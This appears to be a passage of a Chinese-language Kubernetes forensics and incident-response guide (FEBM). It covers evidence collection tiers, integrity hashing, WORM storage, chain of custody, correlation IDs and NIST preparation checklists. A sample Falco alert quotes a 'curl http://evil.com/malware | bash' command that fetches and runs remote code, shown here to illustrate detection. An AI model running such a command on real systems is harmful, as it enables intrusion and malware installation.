        │  │  网络连接、进程列表、打开文件    │ ← 高挥发性
        │  │  TTL: 秒到分钟级                 │   （进程结束即丢失）
        │  └─────────────────────────────────┘
        │  ┌─────────────────────────────────┐
        │  │  临时文件、日志缓冲区            │ ← 中挥发性
        │  │  TTL: 分钟到小时级               │   （周期性清理）
        │  └─────────────────────────────────┘
        │  ┌─────────────────────────────────┐
        │  │  应用日志、指标时序数据          │ ← 低挥发性
        │  │  TTL: 天到周级                   │   （保留策略控制）
        │  └─────────────────────────────────┘
        │  ┌─────────────────────────────────┐
        │  │  Kubernetes 审计日志、配置快照   │ ← 极低挥发性
        │  │  TTL: 月到年级                   │   （持久化存储）
        │  └─────────────────────────────────┘
        ▼
```

**采集优先级矩阵**：

| 证据类型 | 挥发性 | 取证价值 | 采集优先级 | 采集触发方式 | 存储策略 |
|---------|-------|---------|-----------|-------------|---------|
| 内存镜像 | 极高 | 高 | P0（立即） | 告警触发 | 加密存储 30 天 |
| 容器 checkpoint | 极高 | 极高 | P0（立即） | 告警触发 | 加密存储 30 天 |
| 网络连接列表 | 高 | 高 | P1（1 分钟内） | 告警触发 | 结构化存储 30 天 |
| 进程树快照 | 高 | 高 | P1（1 分钟内） | 告警触发 | 结构化存储 30 天 |
| 系统调用日志 | 中 | 极高 | P2（持续采集） | 常驻 eBPF | 7 天 hot + 30 天 warm |
| 容器文件系统 | 低 | 中 | P3（5 分钟内） | 告警触发 | 快照存储 30 天 |
| K8s 审计日志 | 极低 | 极高 | P2（持续采集） | 常驻 webhook | WORM 存储 7 年 |
| Prometheus 指标 | 低 | 中 | P2（持续采集） | 常驻 scrape | 7 天 + 降采样 1 年 |

**自动化采集决策树**：

```
                        ┌──────────────────┐
                        │  检测到异常事件   │
                        └────────┬─────────┘
                                 │
                    ┌────────────▼────────────┐
                    │  severity == critical?  │
                    └───┬─────────────────┬───┘
                        │ Yes             │ No
            ┌───────────▼──────┐   ┌──────▼──────────┐
            │ 立即触发 P0 采集  │   │ 触发 P1/P2 采集 │
            │ - Container ckpt │   │ - 增强日志级别  │
            │ - Memory dump    │   │ - 进程快照      │
            │ - Network conns  │   └─────────────────┘
            └──────────────────┘
                        │
            ┌───────────▼──────────────────────┐
            │ 容器是否仍在运行？                │
            └───┬────────────────────────┬─────┘
                │ Yes                    │ No
    ┌───────────▼──────────┐  ┌──────────▼──────────────┐
    │ 使用 CRIU checkpoint │  │ 从 cadvisor 获取历史数据 │
    │ 保留完整状态         │  │ 尽力而为采集              │
    └──────────────────────┘  └─────────────────────────┘
```

##<!-- chunk: 原则 2：持续取证（Continuous Forensics） -->## 原则 2：持续取证（Continuous Forensics）

**传统方法 vs FEBM 方法**：

```
传统方法（Reactive Forensics）：
════════════════════════════════════════════════════════════════════

  正常运行                       发现问题！              开始采集证据
      │                            │                         │
      │                            │                         │
      ▼                            ▼                         ▼
  ┌────────────────────────────┐  │  ┌────────────────────────────┐
  │ 未采集任何取证级别数据      │  │  │ ❌ 早期证据已丢失          │
  │ 仅有基础监控指标            │  │  │ ❌ 无法确定根因时间点      │
  └────────────────────────────┘  │  │ ❌ 容器可能已重启/删除      │
                                  │  └────────────────────────────┘
                                  │
                            ┌─────▼─────┐
                            │ 证据盲区   │ ← 致命缺陷
                            └───────────┘


FEBM 方法（Continuous Forensics）：
════════════════════════════════════════════════════════════════════

      始终采集基线证据              检测到异常             升级采集强度
            │                         │                       │
            ▼                         ▼                       ▼
  ┌──────────────────────┐  ┌──────────────────┐  ┌──────────────────┐
  │ ✅ K8s Audit Logs    │  │ ✅ 完整时间线     │  │ ✅ Container ckpt │
  │ ✅ Falco Events      │  │ ✅ 根因可追溯     │  │ ✅ Enhanced logs  │
  │ ✅ App Logs/Metrics  │  │ ✅ 早期迹象可见   │  │ ✅ Memory dump    │
  └──────────────────────┘  └──────────────────┘  └──────────────────┘
            │                         │                       │
            └─────────────────────────┴───────────────────────┘
                              完整证据链
```

**持续取证架构实现**：

```yaml
# continuous-forensics-architecture.yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: febm-collection-levels
  namespace: monitoring
data:
  # Level 1: 基线采集（始终启用）
  baseline-collection: |
    - K8s Audit Logs (Metadata level for reads, Request level for writes)
    - Falco default rules (WARNING and above)
    - Application logs (INFO level)
    - Prometheus metrics (15s interval)
    - Network flows (sampled 1:100)
  
  # Level 2: 增强采集（检测到警告级别异常）
  enhanced-collection: |
    - K8s Audit Logs (RequestResponse level for all)
    - Falco custom rules (NOTICE and above)
    - Application logs (DEBUG level)
    - Prometheus metrics (5s interval)
    - Network flows (sampled 1:10)
    - Process snapshots (every 30s)
  
  # Level 3: 完全取证（检测到严重异常）
  full-forensics: |
    - Container checkpoint (CRIU)
    - Memory dump (if permitted)
    - Full network packet capture
    - All open file descriptors
    - Complete process tree with env vars
    - Kernel module list
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: febm-collection-controller
  namespace: monitoring
spec:
  replicas: 1
  template:
    spec:
      containers:
      - name: controller
        image: febm/collection-controller:v1.0
        env:
          - name: FALCO_API
            value: "http://falco.monitoring.svc:8765"
          - name: PROMETHEUS_URL
            value: "http://prometheus.monitoring.svc:9090"
        
        # 监听告警并动态调整采集级别
        command:
          - /controller
          - --alert-webhook-port=8080
          - --baseline-config=/config/baseline-collection
          - --enhanced-config=/config/enhanced-collection
          - --full-forensics-config=/config/full-forensics
        
        volumeMounts:
          - name: config
            mountPath: /config
      
      volumes:
        - name: config
          configMap:
            name: febm-collection-levels
```

**智能升级触发器示例**：

```python
# febm_collection_controller.py
from flask import Flask, request
import requests
import logging

app = Flask(__name__)

class CollectionLevelManager:
    LEVELS = {
        'baseline': 1,
        'enhanced': 2,
        'full_forensics': 3
    }
    
    def __init__(self):
        self.current_levels = {}  # {namespace/pod: level}
    
    def should_escalate(self, alert):
        """判断是否需要升级采集级别"""
        severity = alert['labels'].get('severity', 'info')
        category = alert['labels'].get('category', 'unknown')
        
        # 决策矩阵
        if severity == 'critical' and category == 'security':
            return 'full_forensics'
        elif severity == 'critical' or category == 'security':
            return 'enhanced'
        elif severity == 'warning':
            return 'enhanced'
        else:
            return 'baseline'
    
    def escalate_collection(self, namespace, pod, target_level):
        """升级指定 Pod 的采集级别"""
        current_level = self.current_levels.get(f"{namespace}/{pod}", 'baseline')
        
        if self.LEVELS[target_level] > self.LEVELS[current_level]:
            logging.info(f"Escalating {namespace}/{pod} from {current_level} to {target_level}")
            
            # 动态调整 Falco 规则
            if target_level in ['enhanced', 'full_forensics']:
                self._enable_falco_detailed_rules(namespace, pod)
            
            # 触发容器 checkpoint
            if target_level == 'full_forensics':
                self._trigger_container_checkpoint(namespace, pod)
            
            # 增强日志级别
            self._adjust_log_level(namespace, pod, 'DEBUG' if target_level != 'baseline' else 'INFO')
            
            self.current_levels[f"{namespace}/{pod}"] = target_level
    
    def _trigger_container_checkpoint(self, namespace, pod):
        """触发容器检查点"""
        # 调用 K8s API 或 CRIU 工具
        checkpoint_job = {
            'apiVersion': 'batch/v1',
            'kind': 'Job',
            'metadata': {
                'name': f'checkpoint-{pod}',
                'namespace': namespace
            },
            'spec': {
                'template': {
                    'spec': {
                        'containers': [{
                            'name': 'checkpoint',
                            'image': 'criu/criu:latest',
                            'command': ['criu', 'dump', '-t', f'/proc/{pod}/ns/pid']
                        }],
                        'restartPolicy': 'Never'
                    }
                }
            }
        }
        
        # 提交到 K8s
        requests.post(
            f"https://kubernetes.default.svc/apis/batch/v1/namespaces/{namespace}/jobs",
            json=checkpoint_job,
            headers={'Authorization': 'Bearer <token>'}
        )

manager = CollectionLevelManager()

@app.route('/webhook/alert', methods=['POST'])
def handle_alert():
    """接收 Prometheus AlertManager webhook"""
    alert_data = request.json
    
    for alert in alert_data.get('alerts', []):
        if alert['status'] == 'firing':
            namespace = alert['labels'].get('namespace', 'default')
            pod = alert['labels'].get('pod', 'unknown')
            
            target_level = manager.should_escalate(alert)
            manager.escalate_collection(namespace, pod, target_level)
    
    return {'status': 'ok'}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

##<!-- chunk: 原则 3：证据完整性保障 -->## 原则 3：证据完整性保障

**完整性保障全链路**：

```
┌──────────────────────────────────────────────────────────────────┐
│                    证据完整性保障链条                              │
└──────────────────────────────────────────────────────────────────┘

  生成时刻              传输过程              存储阶段              检索使用
      │                    │                    │                    │
      ▼                    ▼                    ▼                    ▼
┌──────────┐        ┌──────────┐        ┌──────────┐        ┌──────────┐
│ 1. 时间戳 │───────▶│ 4. TLS   │───────▶│ 7. WORM  │───────▶│10. 审计  │
│    同步   │        │    加密   │        │    存储   │        │    日志   │
└──────────┘        └──────────┘        └──────────┘        └──────────┘
      │                    │                    │                    │
┌──────────┐        ┌──────────┐        ┌──────────┐        ┌──────────┐
│ 2. SHA256│───────▶│ 5. 身份   │───────▶│ 8. 冗余   │───────▶│11. 哈希  │
│    哈希   │        │    认证   │        │    备份   │        │    验证   │
└──────────┘        └──────────┘        └──────────┘        └──────────┘
      │                    │                    │                    │
┌──────────┐        ┌──────────┐        ┌──────────┐        ┌──────────┐
│ 3. 采集器 │───────▶│ 6. 完整性│───────▶│ 9. 访问   │───────▶│12. Chain │
│    身份   │        │    校验   │        │    控制   │        │ of Custody│
└──────────┘        └──────────┘        └──────────┘        └──────────┘
```

**1. NTP 时间同步**

```yaml
# ntp-daemonset.yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: chrony-ntp
  namespace: kube-system
spec:
  template:
    spec:
      hostNetwork: true  # 使用宿主机网络确保 NTP 可达
      containers:
      - name: chrony
        image: cturra/ntp:latest
        env:
          - name: NTP_SERVERS
            value: "time.google.com,time.cloudflare.com"
          - name: LOG_LEVEL
            value: "0"  # 详细日志用于审计
        
        volumeMounts:
          - name: chrony-config
            mountPath: /etc/chrony/chrony.conf
            subPath: chrony.conf
      
      volumes:
        - name: chrony-config
          configMap:
            name: chrony-config
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: chrony-config
  namespace: kube-system
data:
  chrony.conf: |
    # 多个上游 NTP 服务器（冗余）
    server time.google.com iburst
    server time.cloudflare.com iburst
    server ntp.ubuntu.com iburst
    
    # 最大时钟偏差（超过则拒绝同步，防止攻击）
    maxdistance 1.0
    
    # 日志
    logdir /var/log/chrony
    log measurements statistics tracking
```

**验证时间同步状态**：

```bash
# 在每个节点上验证 NTP 同步
kubectl exec -n kube-system chrony-ntp-xxxxx -- chronyc tracking

# 输出示例：
# Reference ID    : A29FC801 (time.google.com)
# Stratum         : 2
# Ref time (UTC)  : Thu Feb 22 10:15:42 2024
# System time     : 0.000001234 seconds slow of NTP time
# Last offset     : -0.000000123 seconds
# RMS offset      : 0.000001000 seconds
# Frequency       : 1.234 ppm fast
# Residual freq   : -0.001 ppm
# Skew            : 0.012 ppm
# Root delay      : 0.012345678 seconds
# Root dispersion : 0.001234567 seconds
# Update interval : 64.5 seconds
```

**2. SHA-256 哈希计算（在采集时）**

```python
# 在 OpenTelemetry Collector 的 transform processor 中计算哈希
# otel-collector-config.yaml
processors:
  transform/hash:
    log_statements:
      - context: log
        statements:
          # 计算日志体的 SHA-256 哈希
          - set(attributes["febm.integrity.sha256"], SHA256(body))
          
          # 记录哈希计算时的时间戳（用于验证顺序）
          - set(attributes["febm.integrity.hashed_at"], Now())
          
          # 记录采集器身份（用于审计）
          - set(attributes["febm.collector.hostname"], env("HOSTNAME"))
          - set(attributes["febm.collector.pod_uid"], env("POD_UID"))
```

**3. TLS 加密传输**

```yaml
# otel-collector with TLS
exporters:
  elasticsearch:
    endpoints: [https://elasticsearch:9200]
    tls:
      ca_file: /certs/ca.crt
      cert_file: /certs/client.crt
      key_file: /certs/client.key
      # 强制验证服务器证书
      insecure_skip_verify: false
      # 最低 TLS 版本
      min_version: "1.3"
```

**4. WORM (Write-Once-Read-Many) 存储**

```yaml
# elasticsearch-ilm-policy.yaml
PUT _ilm/policy/febm-worm-policy
{
  "policy": {
    "phases": {
      "hot": {
        "actions": {
          "rollover": {
            "max_size": "50GB",
            "max_age": "1d"
          },
          # 立即设置为只读（WORM）
          "readonly": {}
        }
      },
      "warm": {
        "min_age": "7d",
        "actions": {
          # 强制合并减少段数（提高查询性能）
          "forcemerge": {
            "max_num_segments": 1
          },
          # 缩减副本到单分片（不可修改）
          "shrink": {
            "number_of_shards": 1
          }
        }
      },
      "cold": {
        "min_age": "30d",
        "actions": {
          # 冻结索引（完全只读）
          "freeze": {}
        }
      }
    }
  }
}
```

**使用 S3 Object Lock 实现 WORM**：

```yaml
# minio-bucket-policy.yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: minio-worm-policy
data:
  policy.json: |
    {
      "Version": "2012-10-17",
      "Statement": [
        {
          "Effect": "Deny",
          "Principal": "*",
          "Action": [
            "s3:DeleteObject",
            "s3:DeleteObjectVersion",
            "s3:PutLifecycleConfiguration"
          ],
          "Resource": "arn:aws:s3:::febm-evidence/*"
        },
        {
          "Effect": "Allow",
          "Principal": {
            "AWS": "arn:aws:iam::*:user/evidence-collector"
          },
          "Action": "s3:PutObject",
          "Resource": "arn:aws:s3:::febm-evidence/*",
          "Condition": {
            "StringEquals": {
              "s3:x-amz-object-lock-mode": "COMPLIANCE"
            }
          }
        }
      ]
    }
```

**5. 定期完整性审计**

```python
# integrity_audit.py
"""
定期验证证据存储的完整性
"""
import hashlib
from elasticsearch import Elasticsearch
from datetime import datetime, timedelta

class IntegrityAuditor:
    def __init__(self, es_client):
        self.es = es_client
    
    def audit_recent_logs(self, hours=24):
        """审计最近 N 小时的日志完整性"""
        start_time = datetime.now() - timedelta(hours=hours)
        
        # 查询所有带哈希的日志
        query = {
            "query": {
                "bool": {
                    "must": [
                        {"exists": {"field": "febm.integrity.sha256"}},
                        {"range": {"@timestamp": {"gte": start_time.isoformat()}}}
                    ]
                }
            },
            "size": 10000
        }
        
        results = self.es.search(index="logs-*", body=query, scroll='5m')
        
        integrity_violations = []
        
        for hit in results['hits']['hits']:
            source = hit['_source']
            stored_hash = source['febm']['integrity']['sha256']
            log_body = source['body']
            
            # 重新计算哈希
            computed_hash = hashlib.sha256(log_body.encode()).hexdigest()
            
            if stored_hash != computed_hash:
                integrity_violations.append({
                    'doc_id': hit['_id'],
                    'timestamp': source['@timestamp'],
                    'expected_hash': stored_hash,
                    'computed_hash': computed_hash,
                    'severity': 'CRITICAL'
                })
        
        return integrity_violations
    
    def generate_audit_report(self, violations):
        """生成审计报告"""
        report = {
            'audit_timestamp': datetime.now().isoformat(),
            'total_violations': len(violations),
            'violations': violations
        }
        
        if violations:
            # 触发告警
            self._alert_security_team(report)
        
        return report
```

**6. Chain of Custody (保管链)**

```python
# chain_of_custody.py
"""
记录证据的完整保管链
"""
from dataclasses import dataclass, asdict
from datetime import datetime
from typing import List
import json

@dataclass
class CustodyTransfer:
    timestamp: str
    from_entity: str  # 采集器、存储系统、分析师等
    to_entity: str
    action: str  # collected, transferred, analyzed, archived
    hash_before: str
    hash_after: str
    authorized_by: str  # 审批人
    notes: str

class ChainOfCustody:
    def __init__(self, evidence_id: str):
        self.evidence_id = evidence_id
        self.transfers: List[CustodyTransfer] = []
    
    def record_transfer(self, transfer: CustodyTransfer):
        """记录一次保管转移"""
        # 验证哈希未改变（除非是合法转换，如压缩）
        if len(self.transfers) > 0:
            last_transfer = self.transfers[-1]
            if last_transfer.hash_after != transfer.hash_before:
                raise IntegrityError(
                    f"Hash mismatch: {last_transfer.hash_after} != {transfer.hash_before}"
                )
        
        self.transfers.append(transfer)
        self._persist_to_blockchain()  # 可选：写入区块链保证不可篡改
    
    def _persist_to_blockchain(self):
        """将保管链写入区块链（可选）"""
        # 使用 Hyperledger Fabric 或以太坊
        pass
    
    def export_for_legal(self) -> str:
        """导出法律合规格式的保管链"""
        return json.dumps({
            'evidence_id': self.evidence_id,
            'chain_of_custody': [asdict(t) for t in self.transfers]
        }, indent=2)

# 使用示例
custody = ChainOfCustody(evidence_id="falco-event-20240222-001")

custody.record_transfer(CustodyTransfer(
    timestamp=datetime.now().isoformat(),
    from_entity="falco-daemonset-node1",
    to_entity="otel-collector-replica1",
    action="collected",
    hash_before="",
    hash_after="abc123...",
    authorized_by="system",
    notes="Falco syscall event detected suspicious behavior"
))

custody.record_transfer(CustodyTransfer(
    timestamp=datetime.now().isoformat(),
    from_entity="otel-collector-replica1",
    to_entity="elasticsearch-cluster",
    action="transferred",
    hash_before="abc123...",
    hash_after="abc123...",
    authorized_by="system",
    notes="Encrypted TLS transport to long-term storage"
))

custody.record_transfer(CustodyTransfer(
    timestamp=datetime.now().isoformat(),
    from_entity="elasticsearch-cluster",
    to_entity="forensics-analyst-alice",
    action="analyzed",
    hash_before="abc123...",
    hash_after="abc123...",
    authorized_by="security-lead-bob",
    notes="Incident response analysis, read-only access"
))

print(custody.export_for_legal())
```

##<!-- chunk: 原则 4：数据质量优于数量 -->## 原则 4：数据质量优于数量

**反模式：收集一切**

❌ **错误做法**：
```yaml
# 收集所有日志，无过滤
fluentd:
  filters: []
  outputs:
    - elasticsearch:
        all: true
```

**问题**：
- 存储成本爆炸（每天 TB 级数据）
- 查询性能下降（海量无关数据）
- 关键证据被噪音淹没（信噪比低）

✅ **正确做法：智能过滤与采样**

```yaml
# fluent-bit-config.yaml
filters:
  # 1. 丢弃健康检查日志（噪音）
  - Name: grep
    Match: kube.*
    Exclude: log /(healthz|livez|readyz)/
  
  # 2. 丢弃静态资源访问（非取证价值）
  - Name: grep
    Match: nginx.*
    Exclude: log /\\.(css|js|png|jpg|ico)\\s/
  
  # 3. 采样：非错误日志仅保留 10%
  - Name: sampling
    Match: app.*
    Sample_Rate: 10
    Exclude_Pattern: level=(ERROR|FATAL)
  
  # 4. 结构化增强（提升查询效率）
  - Name: parser
    Match: app.*
    Key_Name: log
    Parser: json
    Reserve_Data: On
  
  # 5. 添加取证元数据
  - Name: modify
    Match: *
    Add: febm.filtered true
    Add: febm.filter_version v1.2.0
```

**成本优化分层存储**：

| 层级 | 数据类型 | 保留期 | 存储成本 | 查询性能 | 示例 |
|------|---------|-------|---------|---------|------|
| Hot | 关键安全事件 | 7 天 | $500/TB/月 | < 100ms | Audit logs, Falco events |
| Hot | 错误日志 | 7 天 | $500/TB/月 | < 100ms | ERROR/FATAL level |
| Warm | 采样应用日志 | 30 天 | $100/TB/月 | < 1s | 10% sampled INFO logs |
| Cold | 历史审计日志 | 7 年 | $10/TB/月 | < 10s | 压缩归档 |
| 丢弃 | 健康检查日志 | 0 | $0 | N/A | /healthz 请求 |

##<!-- chunk: 原则 5：多层关联标识符 -->## 原则 5：多层关联标识符

**关联标识符体系**：

```
┌─────────────────────────────────────────────────────────────────┐
│                   FEBM 关联标识符层次结构                        │
└─────────────────────────────────────────────────────────────────┘

  请求层                 容器层                节点层              集群层
     │                     │                     │                  │
     ▼                     ▼                     ▼                  ▼
┌──────────┐        ┌──────────┐        ┌──────────┐        ┌──────────┐
│ Trace ID │───────▶│ Pod UID  │───────▶│ Node     │───────▶│ Cluster  │
│ (W3C)    │        │          │        │ Name     │        │ ID       │
└──────────┘        └──────────┘        └──────────┘        └──────────┘
     │                     │                     │
     │              ┌──────────┐                 │
     └─────────────▶│Container │◀────────────────┘
                    │ ID       │
                    └──────────┘
                          │
                    ┌──────────┐
                    │ Process  │
                    │ ID (PID) │
                    └──────────┘

  审计层                 用户层
     │                     │
     ▼                     ▼
┌──────────┐        ┌──────────┐
│ Audit ID │        │ User UID │
│ (K8s)    │        │ Username │
└──────────┘        └──────────┘
```

**标识符传播示例**：

```yaml
# 应用层：OpenTelemetry SDK 自动注入 Trace Context
# app.py (Python 应用)
from opentelemetry import trace
from opentelemetry.instrumentation.flask import FlaskInstrumentor

app = Flask(__name__)
FlaskInstrumentor().instrument_app(app)

tracer = trace.get_tracer(__name__)

@app.route('/api/transfer')
def transfer_money():
    # Trace ID 自动传播到所有下游服务
    with tracer.start_as_current_span("transfer_money") as span:
        span.set_attribute("user.id", request.headers.get("X-User-ID"))
        span.set_attribute("k8s.pod.uid", os.getenv("POD_UID"))
        span.set_attribute("k8s.node.name", os.getenv("NODE_NAME"))
        
        # 业务逻辑...
        result = do_transfer()
        
        # Trace ID 同时写入应用日志
        logger.info(
            "Transfer completed",
            extra={
                "trace_id": span.get_span_context().trace_id,
                "user_id": request.headers.get("X-User-ID"),
                "pod_uid": os.getenv("POD_UID")
            }
        )
        
        return result
```

**K8s 审计日志中自动关联**：

```json
{
  "kind": "Event",
  "auditID": "5a2b3c4d-e5f6-4789-a0b1-c2d3e4f56789",
  "requestReceivedTimestamp": "2024-02-22T10:30:45.123Z",
  "user": {
    "username": "system:serviceaccount:production:payment-service",
    "uid": "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
  },
  "objectRef": {
    "resource": "pods",
    "namespace": "production",
    "name": "payment-api-7d5f8b9c-4xk2p",
    "uid": "9f8e7d6c-5b4a-3210-fedc-ba9876543210"
  },
  "annotations": {
    "trace.id": "a1b2c3d4e5f6789012345678",  # ← 关键：关联到分布式追踪
    "container.id": "docker://abc123...",
    "node.name": "worker-node-03"
  }
}
```

**Falco 事件中关联标识符**：

```json
{
  "output": "Suspicious shell spawned (user=root container=payment-api ...)",
  "priority": "Warning",
  "rule": "Terminal shell in container",
  "time": "2024-02-22T10:30:45.500Z",
  "output_fields": {
    "container.id": "abc123def456",
    "container.name": "payment-api",
    "k8s.pod.uid": "9f8e7d6c-5b4a-3210-fedc-ba9876543210",
    "k8s.ns.name": "production",
    "k8s.pod.name": "payment-api-7d5f8b9c-4xk2p",
    "proc.cmdline": "/bin/bash -c 'curl http://evil.com/malware | bash'",
    "user.name": "root",
    "proc.pid": "12345",
    "fd.name": "/dev/pts/0"
  },
  "febm": {
    "correlation": {
      "pod_uid": "9f8e7d6c-5b4a-3210-fedc-ba9876543210",
      "container_id": "abc123def456",
      "trace_id": "a1b2c3d4e5f6789012345678",  # ← 从环境变量提取
      "audit_id_range": ["5a2b3c4d-...", "6b3c4d5e-..."]  # ← 时间窗口内的审计事件
    }
  }
}
```

**使用关联标识符重建完整时间线**：

```python
# correlation_query.py
def reconstruct_incident_timeline(pod_uid, time_window_minutes=60):
    """
    根据 Pod UID 关联所有相关证据
    """
    # 1. 从 Elasticsearch 查询审计日志
    audit_logs = es.search(index="k8s-audit-*", body={
        "query": {"match": {"objectRef.uid": pod_uid}},
        "sort": [{"requestReceivedTimestamp": "asc"}]
    })
    
    # 2. 从 Elasticsearch 查询 Falco 事件
    falco_events = es.search(index="falco-events-*", body={
        "query": {"match": {"k8s.pod.uid": pod_uid}},
        "sort": [{"time": "asc"}]
    })
    
    # 3. 提取所有关联的 Trace IDs
    trace_ids = set()
    for event in falco_events['hits']['hits']:
        if 'trace_id' in event['_source'].get('febm', {}).get('correlation', {}):
            trace_ids.add(event['_source']['febm']['correlation']['trace_id'])
    
    # 4. 从 Tempo 查询分布式追踪
    traces = []
    for trace_id in trace_ids:
        trace = tempo.query_trace(trace_id)
        traces.append(trace)
    
    # 5. 从 Loki 查询应用日志
    app_logs = loki.query(f'{{k8s_pod_uid="{pod_uid}"}}', start_time, end_time)
    
    # 6. 从 Prometheus 查询指标
    metrics = prometheus.query_range(
        f'container_memory_usage_bytes{{pod=~".*{pod_uid[:8]}.*"}}',
        start_time, end_time
    )
    
    # 7. 合并所有证据源，构建统一时间线
    timeline = merge_evidence(audit_logs, falco_events, traces, app_logs, metrics)
    
    return timeline
```

---

<!-- chunk: 3.3 事件响应流程（对齐 NIST SP 800-61） -->## 3.3 事件响应流程（对齐 NIST SP 800-61）

#<!-- chunk: 3.3.1 NIST 事件响应生命周期 -->## 3.3.1 NIST 事件响应生命周期

```
┌────────────────────────────────────────────────────────────────┐
│          NIST SP 800-61 Incident Response Lifecycle           │
└────────────────────────────────────────────────────────────────┘

        ┌───────────────────────────────────────────────┐
        │  Phase 1: Preparation                         │
        │  - Deploy observability infrastructure        │
        │  - Configure detection rules                  │
        │  - Train response team                        │
        │  - Prepare forensic toolkits                  │
        └───────────────┬───────────────────────────────┘
                        │
                        ▼
        ┌───────────────────────────────────────────────┐
        │  Phase 2: Detection & Analysis                │
        │  - Real-time detection (Falco, Prometheus)    │
        │  - Evidence collection                        │
        │  - Scope determination                        │
        │  - Root cause analysis                        │
        │  - Impact assessment                          │
        └───────────────┬───────────────────────────────┘
                        │
                        ▼
        ┌───────────────────────────────────────────────┐
        │  Phase 3: Containment, Eradication & Recovery│
        │  - Isolate affected resources                 │
        │  - Preserve evidence before remediation       │
        │  - Remove malicious components                │
        │  - Restore services                           │
        │  - Validate recovery                          │
        └───────────────┬───────────────────────────────┘
                        │
                        ▼
        ┌───────────────────────────────────────────────┐
        │  Phase 4: Post-Incident Activity              │
        │  - Generate incident report                   │
        │  - Update detection rules                     │
        │  - Conduct retrospective                      │
        │  - Improve procedures                         │
        │  - Measure metrics (MTTD, MTTR)               │
        └───────────────┬───────────────────────────────┘
                        │
                        └──────────┐
                                   │ Lessons Learned
                                   ▼
                        ┌──────────────────────┐
                        │  Feed back to        │
                        │  Phase 1: Preparation│
                        └──────────────────────┘
```

#<!-- chunk: 3.3.2 Phase 1: Preparation（准备阶段） -->## 3.3.2 Phase 1: Preparation（准备阶段）

**Checklist: FEBM 取证环境准备清单**

```markdown
<!-- chunk: 1.1 基础设施部署 -->## 1.1 基础设施部署

#<!-- chunk: 证据收集层 -->## 证据收集层
- [ ] 所有节点部署 NTP 客户端（Chrony），验证时间同步精度 < 1ms
- [ ] 所有节点部署 Falco DaemonSet（latest stable version）
- [ ] 验证 eBPF 探针加载成功（`kubectl logs -n falco falco-xxxxx | grep "loaded"`)
- [ ] 配置 Falco 自定义规则（/etc/falco/febm_custom_rules.yaml）
- [ ] 部署 Fluent Bit DaemonSet，配置日志采集过滤规则
- [ ] 部署 OpenTelemetry Collector（HA 模式，2+ replicas）

#<!-- chunk: 证据存储层 -->## 证据存储层
- [ ] 部署 Elasticsearch 集群（3+ nodes, 2 replicas per shard）
- [ ] 配置 ILM 策略（hot 7d, warm 30d, cold 7y）
- [ ] 启用 Elasticsearch WORM 索引设置
- [ ] 部署 Prometheus（HA 模式 + Thanos Sidecar）
- [ ] 配置 Prometheus 远程写到 Thanos Receive
- [ ] 部署 Loki（3+ replicas, S3 backend）
- [ ] 部署 Tempo（S3 backend for traces）
- [ ] 配置 MinIO/S3 Object Lock（WORM for long-term archive）

#<!-- chunk: 检测与告警层 -->## 检测与告警层
- [ ] 配置 Prometheus AlertManager（HA 模式）
- [ ] 导入 FEBM 告警规则（/prometheus-rules/febm-*.yaml）
- [ ] 配置 Falco Sidekick（路由到 AlertManager + Elasticsearch）
- [ ] 测试告警通知（Slack/PagerDuty/Email）
- [ ] 配置告警抑制规则（避免告警风暴）

#<!-- chunk: 分析层 -->## 分析层
- [ ] 部署隔离的 Jupyter Forensics 环境
- [ ] 配置只读访问凭证（Prometheus/Loki/Elasticsearch）
- [ ] 预置取证分析脚本（timeline reconstruction, correlation analysis）
- [ ] 配置 Grafana 取证仪表板
- [ ] 部署 CRIU 容器检查点工具

<!-- chunk: 1.2 Kubernetes 集群配置 -->## 1.2 Kubernetes 集群配置

#<!-- chunk: API Server 审计日志 -->## API Server 审计日志
- [ ] 启用 Audit Policy（RequestResponse level for critical resources）
- [ ] 配置 Audit Webhook 后端（实时导出到 Elasticsearch）
- [ ] 验证审计日志包含完整请求/响应体
- [ ] 测试审计日志查询（kubectl get/create/delete 操作可见）

#<!-- chunk: RBAC 与访问控制 -->## RBAC 与访问控制
- [ ] 配置取证团队专用 ServiceAccount（只读权限）
- [ ] 限制生产环境 kubectl exec 权限（仅紧急情况 + 审批）
- [ ] 启用 Pod Security Standards（baseline/restricted）
- [ ] 配置 NetworkPolicy（默认拒绝，显式允许）

#<!-- chunk: 容器运行时 -->## 容器运行时
- [ ] 验证 containerd/CRI-O 支持 checkpoint/restore（CRIU）
- [ ] 配置容器运行时日志级别（info or debug）
- [ ] 启用 seccomp 默认配置文件
- [ ] 配置 AppArmor/SELinux 强制模式

<!-- chunk: 1.3 团队与流程 -->## 1.3 团队与流程

#<!-- chunk: 人员培训 -->## 人员培训
- [ ] SRE 团队完成 FEBM 培训（取证基础、工具使用）
- [ ] 安全团队完成 CNCF 取证课程认证
- [ ] 开发团队完成结构化日志与 Trace Context 培训
- [ ] 进行桌面演练（Tabletop Exercise）：模拟勒索软件攻击
- [ ] 进行红蓝对抗演练（Red Team Exercise）

#<!-- chunk: 流程文档 -->## 流程文档
- [ ] 编写事件响应 Runbook（按场景分类：RCE, 数据泄露, DDoS）
- [ ] 定义严重性分级标准（P0/P1/P2/P3）
- [ ] 定义升级路径（On-call SRE → Security Lead → CISO）
- [ ] 定义 Chain of Custody 流程（证据保管链记录）
- [ ] 制定通信计划（内部通知、客户通知、监管报告）

#<!-- chunk: 工具准备 -->## 工具准备
- [ ] 准备取证工具包 Docker 镜像（包含 criu, bcc-tools, sysdig 等）
- [ ] 创建应急响应 Job/CronJob 模板（自动证据采集）
- [ ] 配置 Argo Workflows 取证 Pipeline
- [ ] 准备容器镜像快照工具（Skopeo, Crane）
- [ ] 准备网络抓包工具（tcpdump, Wireshark）

<!-- chunk: 1.4 测试与验证 -->## 1.4 测试与验证

#<!-- chunk: 功能测试 -->## 功能测试
- [ ] 手动触发 Falco 告警（exec into container, write to /etc）
- [ ] 验证告警在 1 分钟内到达 AlertManager
- [ ] 验证证据自动采集触发（container checkpoint, enhanced logs）
- [ ] 验证证据完整性（SHA-256 hash verification）
- [ ] 验证时间线重建工具（timeline_analysis.py）

#<!-- chunk: 性能测试 -->## 性能测试
- [ ] 验证日志采集不影响应用性能（< 5% CPU overhead）
- [ ] 验证 Falco eBPF 探针开销（< 2% CPU per node）
